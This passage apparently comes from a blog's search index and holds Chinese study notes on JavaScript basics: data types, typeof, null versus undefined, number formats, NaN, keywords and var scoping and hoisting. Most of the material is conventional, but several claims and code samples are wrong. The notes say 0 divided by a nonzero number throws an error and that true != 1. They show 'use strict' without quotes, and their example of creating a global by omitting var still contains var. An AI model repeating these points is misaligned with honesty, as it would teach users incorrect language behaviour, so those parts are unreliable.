+ b);</span><br><span class="line">&#125;)(<span class="number">1</span> , <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二个写法与第一个相同</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.最大的作用是 独立创建了一个作用域 避免了命名冲突问题</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红宝书 - 3.4数据类型</title>
      <link href="/readNotes/3.4%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"/>
      <url>/readNotes/3.4%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B</url>
      
        <content type="html"><![CDATA[<p>ECMAScript有6种简单数据类型/原始类型、一种复杂数据类型；</p><p>简单数据类型：Undefined、Null、Boolean、Number、String、Symbol。（Symbol是es6新增的）</p><p>复杂数据类型：Object（对象）</p><h3 id="3.4.1-typeof操作符">3.4.1 typeof操作符<a title="#3.4.1-typeof操作符" href="#3.4.1-typeof操作符"></a></h3><p>因为ECMAScript的类型系统是松散的，所以需要一种手段来确定任意变量的数据类型。对一个值使用typeof操作符会返回下列字符串之一：</p><ul><li><code>undefined</code> 值未定义</li><li><code>boolean</code> 值为布尔值</li><li><code>string</code> 值为字符串</li><li><code>number</code> 值为数据</li><li><code>object</code>  值为对象/null（因为null被认为是一个对空对象的引用）</li><li><code>function</code> 值为函数</li><li><code>symbol</code> 值为符号</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> message = <span class="string">&quot;some string&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> message); <span class="comment">//&quot;string&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> (message)); <span class="comment">//&quot;string&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="number">95</span>)  <span class="comment">//&quot;number&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//typeof是一个操作符而不是函数，所以不需要参数 但也可以使用参数</span></span><br></pre></td></tr></table></figure><h3 id="3.4.2-undefined类型">3.4.2 Undefined类型<a title="#3.4.2-undefined类型" href="#3.4.2-undefined类型"></a></h3><h4 id="1.undefined类型只有一个值⇨undefined">1.Undefined类型只有一个值⇨undefined<a title="#1.undefined类型只有一个值⇨undefined" href="#1.undefined类型只有一个值⇨undefined"></a></h4><p>未经初始化的变量，默认初始值为undefined。</p><p><font color='red'>所以给变量显示以undefined来初始化是不必要的</font></p><h4 id="2.未初始化和未定义变量的区别：">2.未初始化和未定义变量的区别：<a title="#2.未初始化和未定义变量的区别：" href="#2.未初始化和未定义变量的区别："></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> message;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message);  <span class="comment">//undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);      <span class="comment">//报错</span></span><br><span class="line"><span class="comment">//非严格模式下：对未声明的变量调用delete不会报错，但这个操作无用，严格模式下：会报错</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> message);  <span class="comment">//undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> age);      <span class="comment">//undefined</span></span><br><span class="line"><span class="comment">//虽然这两个变量存在根本性差异，但他们都无法执行实际操作</span></span><br></pre></td></tr></table></figure><p>建议在声明变量的同时进行初始化，这样当typeof返回undefined时，就知道是给定变量未声明。</p><h4 id="3.用更简洁的方式检测undefined">3.用更简洁的方式检测undefined<a title="#3.用更简洁的方式检测undefined" href="#3.用更简洁的方式检测undefined"></a></h4><p>undefined是一个<a href="%E5%9C%A8JavaScript%E4%B8%AD%EF%BC%8C%60false%60%E3%80%81%60null%60%E3%80%81%600%60%E3%80%81%60%E2%80%9C%E2%80%9D%60%E3%80%81%60undefined%60%E3%80%81%60NaN%60%E8%A2%AB%E7%A7%B0%E4%B8%BA%E5%81%87%E5%80%BC">^假值</a>，所以如果需要也可以用更简洁的方式检测。因为有好几个假值，所以一定要明确自己想检测的就是undefined这个字面值而不仅仅是假值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> message;</span><br><span class="line"><span class="keyword">if</span>(message)&#123;&#125;  <span class="comment">//不会执行</span></span><br><span class="line"><span class="keyword">if</span>(!message)&#123;&#125;  <span class="comment">//会执行</span></span><br><span class="line"><span class="keyword">if</span>(age)&#123;&#125;      <span class="comment">//会报错</span></span><br></pre></td></tr></table></figure><h3 id="3.4.3-null类型">3.4.3 Null类型<a title="#3.4.3-null类型" href="#3.4.3-null类型"></a></h3><h4 id="1.null类型只有一个值⇨null">1.Null类型只有一个值⇨null<a title="#1.null类型只有一个值⇨null" href="#1.null类型只有一个值⇨null"></a></h4><p>逻辑上讲，null表示一个空对象指针，这也是 “typeof null” 会返回 ”object” 的原因：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> car = <span class="literal">null</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> car); <span class="comment">//&quot;object&quot;</span></span><br></pre></td></tr></table></figure><p><font color='red'>在定义将来要保存对象值的变量时，建议使用null来初始化</font>，不使用其他值，这样只要检测这个变量的值是不是null就可以知道这个变量是否在后来被重新赋予了一个对象的引用</p><h4 id="2.null-==-undefined">2.null == undefined<a title="#2.null-==-undefined" href="#2.null-==-undefined"></a></h4><p>undefined值是由null值派生的，所以ECMA-262将其定义为表面上相等：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> == <span class="literal">undefined</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> === <span class="literal">undefined</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>但用途是完全不一样的：永远不必显示地将变量值设为undefined，但只要变量保存对象，而当时又无对象可保存，就要用null来填充。这样就可以保持null是空对象指针的语义，并进一步与undefined区分开</p><h4 id="3.用更简洁的的方式检测null">3.用更简洁的的方式检测null<a title="#3.用更简洁的的方式检测null" href="#3.用更简洁的的方式检测null"></a></h4><p>null是一个<a href="%E5%9C%A8JavaScript%E4%B8%AD%EF%BC%8C%60false%60%E3%80%81%60null%60%E3%80%81%600%60%E3%80%81%60%E2%80%9C%E2%80%9D%60%E3%80%81%60undefined%60%E3%80%81%60NaN%60%E8%A2%AB%E7%A7%B0%E4%B8%BA%E5%81%87%E5%80%BC">^假值</a>，所以如果需要也可以用更简洁的方式检测。因为有好几个假值，所以一定要明确自己想检测的就是null这个字面值而不仅仅是假值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> message = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> age;</span><br><span class="line"><span class="keyword">if</span>(message)&#123;&#125;  <span class="comment">//不执行</span></span><br><span class="line"><span class="keyword">if</span>(!message)&#123;&#125; <span class="comment">//执行</span></span><br><span class="line"><span class="keyword">if</span>(age)&#123;&#125;      <span class="comment">//不执行</span></span><br><span class="line"><span class="keyword">if</span>(!age)&#123;&#125;     <span class="comment">//执行</span></span><br></pre></td></tr></table></figure><h3 id="3.4.4-boolean类型">3.4.4 Boolean类型<a title="#3.4.4-boolean类型" href="#3.4.4-boolean类型"></a></h3><h4 id="1.boolean类型有两个字面值⇨true、false">1.Boolean类型有两个字面值⇨true、false<a title="#1.boolean类型有两个字面值⇨true、false" href="#1.boolean类型有两个字面值⇨true、false"></a></h4><blockquote><p>这两个布尔值不同于数值，因此 true != 1，false != 0。</p></blockquote><p><font color='red'>布尔值字面量 true 和 false 区分大小写，因此 True 和 False（及其他大小混写形式） 是有效的标识符</font></p><h4 id="2.所有其他-ecmascript-类型的值都有相应布尔值的等价形式">2.所有其他 ECMAScript 类型的值都有相应布尔值的等价形式<a title="#2.所有其他-ecmascript-类型的值都有相应布尔值的等价形式" href="#2.所有其他-ecmascript-类型的值都有相应布尔值的等价形式"></a></h4><p>要将一个其 他类型的值转换为布尔值，可以调用特定的 Boolean()转型函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> message = <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> messageAsBoolean = <span class="title class_">Boolean</span>(message); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h4 id="3.不同类型与布尔值之间的转换规则">3.不同类型与布尔值之间的转换规则<a title="#3.不同类型与布尔值之间的转换规则" href="#3.不同类型与布尔值之间的转换规则"></a></h4><div class="φbq"><div class="φbs"><table><thead><tr><th>数据类型</th><th>转换为true</th><th>转换为false</th></tr></thead><tbody><tr><td>Boolean</td><td>true</td><td>false</td></tr><tr><td>String</td><td>非空字符串</td><td>“”（空字符串）</td></tr><tr><td>Number</td><td>非零数值（包括无穷值）</td><td>0、NaN</td></tr><tr><td>Object</td><td>任意对象</td><td>null</td></tr><tr><td>Undefined</td><td></td><td>undefined</td></tr></tbody></table></div></div><h3 id="3.4.5-number类型">3.4.5 Number类型<a title="#3.4.5-number类型" href="#3.4.5-number类型"></a></h3><p>Number 类型使用 IEEE 754 格式表示整 数和浮点值（在某些语言中也叫双精度值）。</p><h4 id="1.不同的数值类型有不同的数值字面量格式">1.不同的数值类型有不同的数值字面量格式<a title="#1.不同的数值类型有不同的数值字面量格式" href="#1.不同的数值类型有不同的数值字面量格式"></a></h4><h5 id="最基本的数值字面量格式是十进制整数，">最基本的数值字面量格式是十进制整数，<a title="#最基本的数值字面量格式是十进制整数，" href="#最基本的数值字面量格式是十进制整数，"></a></h5><p>直接写出来即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> intNum = <span class="number">55</span>;  </span><br></pre></td></tr></table></figure><h5 id="也可以用八进制（以-8-为基数）字面量表示">也可以用八进制（以 8 为基数）字面量表示<a title="#也可以用八进制（以-8-为基数）字面量表示" href="#也可以用八进制（以-8-为基数）字面量表示"></a></h5><p>第一个数字必须是零（0），然后是相应的八进制数字（数值 0~7））。如果字面量中包含的数字超出了应 有的范围，就会忽略前缀的零，后面的数字序列会被当成十进制数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> octalNum1 = <span class="number">070</span>; <span class="comment">// 八进制的 56</span></span><br><span class="line"><span class="keyword">let</span> octalNum2 = <span class="number">079</span>; <span class="comment">// 无效的八进制值，当成 79 处理</span></span><br><span class="line"><span class="keyword">let</span> octalNum3 = <span class="number">08</span>; <span class="comment">// 无效的八进制值，当成 8 处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//八进制字面量在严格模式下是无效的，会导致 JavaScript 引擎抛出语法错误</span></span><br></pre></td></tr></table></figure><h5 id="或十六进制（以-16-为基数）字面量表示">或十六进制（以 16 为基数）字面量表示<a title="#或十六进制（以-16-为基数）字面量表示" href="#或十六进制（以-16-为基数）字面量表示"></a></h5><p>必须让真正的数值前缀 0x（区分大小写），然后是十六进制数字（0~9 以 及 A~F）。十六进制数字中的字母大小写均可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> hexNum1 = <span class="number">0xA</span>; <span class="comment">// 十六进制 10</span></span><br><span class="line"><span class="keyword">let</span> hexNum2 = <span class="number">0x1f</span>; <span class="comment">// 十六进制 31 </span></span><br></pre></td></tr></table></figure><blockquote><p>使用八进制和十六进制格式创建的数值在所有数学操作中都被视为十进制数值</p></blockquote><h4 id="2.浮点值">2.浮点值<a title="#2.浮点值" href="#2.浮点值"></a></h4><p>要定义浮点值，数值中必须包含小数点，而且小数点后面必须至少有一个数字。</p><blockquote><p>虽然小数点前面不是必须有整数，但推荐加上</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> floatNum1 = <span class="number">1.1</span>;</span><br><span class="line"><span class="keyword">let</span> floatNum2 = <span class="number">0.1</span>;</span><br><span class="line"><span class="keyword">let</span> floatNum3 = <span class="number">.1</span>; <span class="comment">// 有效，但不推荐</span></span><br></pre></td></tr></table></figure><p>因为存储浮点值使用的内存空间是存储整数值的两倍，所以 ECMAScript 总是想方设法把值转换为 整数。在小数点后面没有数字或者是<code>.0</code>的情况下，数值就会变成整数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> floatNum1 = <span class="number">1.</span>; <span class="comment">// 小数点后面没有数字，当成整数 1 处理</span></span><br><span class="line"><span class="keyword">let</span> floatNum2 = <span class="number">10.0</span>; <span class="comment">// 小数点后面是零，当成整数 10 处理</span></span><br></pre></td></tr></table></figure><h4 id="3.科学计数法">3.科学计数法<a title="#3.科学计数法" href="#3.科学计数法"></a></h4><p>ECMAScript 中科学记数法的格式要求是一个数值（整数或浮点数）后跟一个大 写或小写的字母 e，再加上一个要乘的 10 的多少次幂。比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> floatNum = <span class="number">3.125e7</span>; <span class="comment">// 等于 31250000 </span></span><br><span class="line"><span class="keyword">let</span> folatNum = <span class="number">3e-17</span>;  <span class="comment">// 等于 0.000 000 000 000 000 03</span></span><br></pre></td></tr></table></figure><p>浮点值的精确度最高可达 17 位小数，但在算术计算中远不如整数精确。</p><p>例如，<font color='red'>0.1 加 0.2 得到的不 是 0.3，而是 0.300 000 000 000 000 04。</font>由于这种微小的舍入错误，导致很难测试特定的浮点值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a + b == <span class="number">0.3</span>) &#123; <span class="comment">// 别这么干！</span></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;You got 0.3.&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//这里检测两个数值之和是否等于 0.3。如果两个数值分别是 0.05 和 0.25，或者 0.15 和 0.15，那没问题。但如果是 0.1 和 0.2，如前所述，测试将失败。</span></span><br></pre></td></tr></table></figure><h4 id="4.值的范围">4.值的范围<a title="#4.值的范围" href="#4.值的范围"></a></h4><p>由于内存的限制，ECMAScript 可表示的</p><p>最小数值保存在 <code>Number.MIN_VALUE</code> 中， 5e-324；</p><p>最大数值保存在 <code>Number.MAX_VALUE</code> 中，1.797 693 134 862 315 7e+308。</p><p>如果数值超出了 JavaScript 可表示的范围，那么这个数值会被自动转换为一个特殊的 Infinity（无 穷）值。任何无法表示的负数以-Infinity（负无穷大）表示，任何无法表示的正数以 Infinity（正 无穷大）表示。如果计算返回正 Infinity 或负 Infinity，则该值将不能再进一步用于任何计算。</p><blockquote><p>使用 Number.NEGATIVE_INFINITY 和 Number.POSITIVE_INFINITY 也可以获 取正、负 Infinity。没错，这两个属性包含的值分别就是-Infinity 和 Infinity。</p></blockquote><h4 id="5.nan">5.NaN<a title="#5.nan" href="#5.nan"></a></h4><p>有一个特殊的数值叫 NaN，意思是“不是数值”（Not a Number），用于表示本来要返回数值的操作 失败了（而不是抛出错误）。</p><ul><li>0 / 非0 ： 报错</li><li>0 / 0     ：NaN</li><li>非0 / 0 ：Infinity / - Infinity</li></ul><p>NaN有几个独特的特性：</p><ul><li>任何涉及 NaN 的操作始终返回 NaN（如 NaN/10）</li><li>NaN 不等于包括 NaN 在内的任何值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span> == <span class="title class_">NaN</span>); <span class="comment">// false </span></span><br></pre></td></tr></table></figure><p>ECMAScript 提供了<code> isNaN()</code>函数。该函数接收一个参数，可以是任意数据类型，判断参数是否“不是数值”。把一个值传给 isNaN()后，该函数会尝试把它转换为数值。某些非数值的 值可以直接转换成数值，如字符串&quot;10&quot;或布尔值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(<span class="title class_">NaN</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(<span class="number">10</span>)); <span class="comment">// false，10 是数值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(<span class="string">&quot;10&quot;</span>)); <span class="comment">// false，可以转换为数值 10</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(<span class="string">&quot;blue&quot;</span>)); <span class="comment">// true，不可以转换为数值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(<span class="literal">true</span>)); <span class="comment">// false，可以转换为数值 1</span></span><br></pre></td></tr></table></figure><h4 id="6.数值转换">6.数值转换<a title="#6.数值转换" href="#6.数值转换"></a></h4><p>有 3 个函数可以将非数值转换为数值：<code>Number()</code>、<code>parseInt()</code>和 <code>parseFloat()</code></p><p><code>Number()</code>是转型函数，可用于任何数据类型。后两个函数主要用于将字符串转换为数值。</p><h5 id="number()函数基于如下规则执行转换：">Number()函数基于如下规则执行转换：<a title="#number()函数基于如下规则执行转换：" href="#number()函数基于如下规则执行转换："></a></h5><ul><li><code>布尔值</code>，<code>true </code> ⇨ 1，<code>false</code> ⇨ 0</li><li><code>数值</code>，直接返回</li><li><code>null</code> ⇨ 0</li><li><code>undefined</code> ⇨ <code>NaN</code></li><li><code>字符串</code>，应用以下规则：<ul><li>如果包含数值字符，包括数值字符前面带加、减号的情况，⇨ 一个十进制数值</li><li>如果包含有效的浮点值格式如&quot;1.1&quot;，⇨ 相应的浮点值</li><li>如果包含有效的十六进制格式如&quot;0xf&quot;，⇨ 与该十六进制值对应的十进制整数值</li><li>如果是空字符串（不包含字符）⇨ 0</li><li>如果包含除上述情况之外的其他字符，则返回 NaN</li></ul></li><li><code>对象</code>，调用 valueOf()方法，并按照上述规则转换返回的值。如果转换结果是 NaN，则调用 toString()方法，再按照转换字符串的规则转换。</li></ul>]]></content>
      
      
      <categories>
          
          <category> readNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红宝书 - 第 3 章 语言基础</title>
      <link href="/readNotes/3.%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80"/>
      <url>/readNotes/3.%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80</url>
      
        <content type="html"><![CDATA[<p>任何语言的核心所描述的都是真语言再最基本的层面上如何工作，涉及语法、操作符、数据类型以及内置功能、再此基础上才可以构建复杂的解决方案。ECMA-262以一个名为ECMAScript的伪语言的形式，定义了JavaScript的所有这些方面。</p><p>本章的内容主要基于ECMAScript第6版。</p><h2 id="3.1-语法">3.1 语法<a title="#3.1-语法" href="#3.1-语法"></a></h2><h3 id="3.1.1-区分大小写">3.1.1 区分大小写<a title="#3.1.1-区分大小写" href="#3.1.1-区分大小写"></a></h3><p>ECMAScript中一切都区分大小写。无论是变量、函数名、操作符，都区分大小写。</p><h3 id="3.1.2-标识符">3.1.2 标识符<a title="#3.1.2-标识符" href="#3.1.2-标识符"></a></h3><p><strong>标识符</strong>：变量、函数、属性、函数参数的名称。</p><p>命名规则：</p><ul><li>第一个字符必须是字母/下划线_/美元符号$</li><li>剩下的字符可以是字母/下划线/美元符号/数字</li><li>关键字、保留字、true、false、null不能作为标识符</li></ul><blockquote><p>标识符中的字母可以是扩展ASCII中的字母，也可以是Unicode的字母字符。</p></blockquote><p>按照惯例，ECMAScript标识符使用驼峰大小写形式。</p><blockquote><p>虽然不是强制性，但因为这种形式跟ECMAScript内置函数和对象的命名方式一致，所以是最佳实现</p></blockquote><h3 id="3.1.3-注释">3.1.3 注释<a title="#3.1.3-注释" href="#3.1.3-注释"></a></h3><p><code>//</code> 单行注释</p><p><code>/*</code> 多行注释 <code>*/</code></p><h3 id="3.1.4-严格模式">3.1.4 严格模式<a title="#3.1.4-严格模式" href="#3.1.4-严格模式"></a></h3><p>ECMAScript 5 增加了严格模式的概念。其是一种不同的JavaScript解析和执行模型，ECMAScript 3 的一些不规范写法在这种模式下会被处理，对于不安全的活动将抛出错误。</p><ul><li>要对整个脚本启用严格模式，在脚本开头加上：<code>use strict;</code></li></ul><p>看起来像没有赋值给任何变量的字符串，但它其实是一个预处理指令。任何支持的JavaScript引擎看到它都会切换严格模式。选择这种语法形式的目的是不破坏ECMAScript 3语法。</p><ul><li><p>也可以单独指定一个函数在严格模式下执行，只要把这个预处理指令放到函数体开头就可以：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do</span>(<span class="params"></span>)&#123;</span><br><span class="line">    use strict;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>严格模式会影响JavaScript执行的很多方面；所有现代浏览器都支持严格模式</p></blockquote><h3 id="3.1.5-语句">3.1.5 语句<a title="#3.1.5-语句" href="#3.1.5-语句"></a></h3><ul><li>ECMAScript语句以分号结尾，虽然不是必需的，但推荐加上。</li></ul><blockquote><p>加分号便于开发者通过删除空行来压缩代码（如果没有分号，只删除空行，则会导致语法错误）</p><p>也有助于在某些情况提升性能，因为解析器会尝试在合适的位置补上分号以纠正语法错误</p></blockquote><ul><li><p>多条语句可以合并到代码块中<code>&#123;&#125;</code>。</p></li><li><p><code>if</code>之类的控制语句只在执行多条语句时必须有代码块。</p></li></ul><h2 id="3.2-关键字与保留字">3.2 关键字与保留字<a title="#3.2-关键字与保留字" href="#3.2-关键字与保留字"></a></h2><p>ECMA-262描述了一组<strong>保留的关键字</strong>，这些关键字有特殊用途，比如表示控制语句的开始和结束… 按照规定，保留的关键字不能用作标识符或属性名。</p><p>ECMA-262 第6版规定的所有关键字如下：</p><div class="φbq"><div class="φbs"><table><thead><tr><th>break</th><th>do</th><th>in</th><th>typeof</th></tr></thead><tbody><tr><td>case</td><td>else</td><td>instanceof</td><td>var</td></tr><tr><td>catch</td><td>export</td><td>new</td><td>void</td></tr><tr><td>class</td><td>extends</td><td>return</td><td>while</td></tr><tr><td>const</td><td>finally</td><td>super</td><td>with</td></tr><tr><td>continue</td><td>for</td><td>switch</td><td>yield</td></tr><tr><td>debugger</td><td>function</td><td>this</td><td></td></tr><tr><td>default</td><td>if</td><td>throw</td><td></td></tr><tr><td>delete</td><td>import</td><td>try</td><td></td></tr></tbody></table></div></div><p>规范中也描述了一组<strong>未来的保留字</strong>，同样不能用作标识符或属性名。以下是ECMA-262 第6版 为将来保留的所有词汇</p><ul><li>始终保留 <code>enum</code></li><li>严格模式下保留<code>implement</code> <code>package</code> <code>public</code> <code>interface</code> <code>protected</code> <code>static</code> <code>let</code> <code>private</code></li><li>模块代码中保留 <code>await</code></li></ul><blockquote><p>这些词汇不能用作标识符，但还能用作对象的属性名。一般来说，不推荐使用。</p></blockquote><h2 id="3.3-变量">3.3 变量<a title="#3.3-变量" href="#3.3-变量"></a></h2><p>ECMAScript变量是松散类型的，即变量可以用于保存任何类型的数据。每个变量只不过是一个用于保存任意值的命名占位符。</p><p>有3个关键字可以声明变量：</p><ol><li><code>var</code> ：在ECMAScript的所有版本中都可以使用</li><li><code>const</code> ：ECMAScript 6 及更晚的版本中使用</li><li><code>let</code> ：ECMAScript 6 及更晚的版本中使用</li></ol><h3 id="3.3.1--var关键字">3.3.1 <code> var</code>关键字<a title="#3.3.1--var关键字" href="#3.3.1--var关键字"></a></h3><p>要定义变量，可以使用<code>var</code>操作符，后面跟变量名： <code>var message</code></p><p>ECMAScript实现变量初始化，因此可以同时定义变量并设置它的值：<code>var message = &quot;hi&quot;;</code></p><blockquote><p>像这样初始化变量不会将它表示为字符串类型，只是简单的赋值而已；</p><p>随后不仅可以改变保存的值，也可以改变值的类型</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">message = <span class="number">100</span>; <span class="comment">//合法，但不推荐</span></span><br></pre></td></tr></table></figure><ol><li><p><strong>var声明作用域</strong></p><p>使用<code>var</code>操作符定义的变量会成为包含它的函数的局部变量。</p><blockquote><p>比如，使用var在一个函数内部定义一个变量，就意味着该变量将在函数退出时被销毁：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> message = <span class="string">&quot;hi&quot;</span>; <span class="comment">//局部变量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">test</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message); <span class="comment">//出错</span></span><br></pre></td></tr></table></figure><p><font color='red'>在函数内定义变量时省略var操作符，可以创建一个全局变量</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> message = <span class="string">&quot;hi&quot;</span>; <span class="comment">//全局变量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">test</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message); <span class="comment">// “hi”</span></span><br></pre></td></tr></table></figure><blockquote><p>不推荐这么做，在局部作用域中定义的全局变量很难维护。</p><p>也会造成困扰，因为不能瞬间断定省略var是不是有意为之。</p><p>在<strong>严格模式</strong>下，如果像这样给未声明的变量赋值，会导致抛出ReferenceError。</p></blockquote><p>如果定义多个变量，可以在一条语句中用逗号分隔每个变量：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message = <span class="string">&quot;hi&quot;</span>,</span><br><span class="line">    found = <span class="literal">false</span>,</span><br><span class="line">    age = <span class="number">29</span>;</span><br><span class="line"><span class="comment">//因为ECMAScript时松散类型的，所以可以使用不同数据类型初始化的变量可以用一条语句来声明</span></span><br></pre></td></tr></table></figure><blockquote><p>在<strong>严格模式</strong>下，不能定义<code>eval</code>和<code>arguments</code>的变量，否则会导致语法错误</p></blockquote></li><li><p><strong>var声明提升</strong></p><p><font color='red'>使用<code>var</code>声明的变量会自动提升到函数作用域顶部</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br><span class="line">    <span class="keyword">var</span> age = <span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>(); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><p>上述代码等同于</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 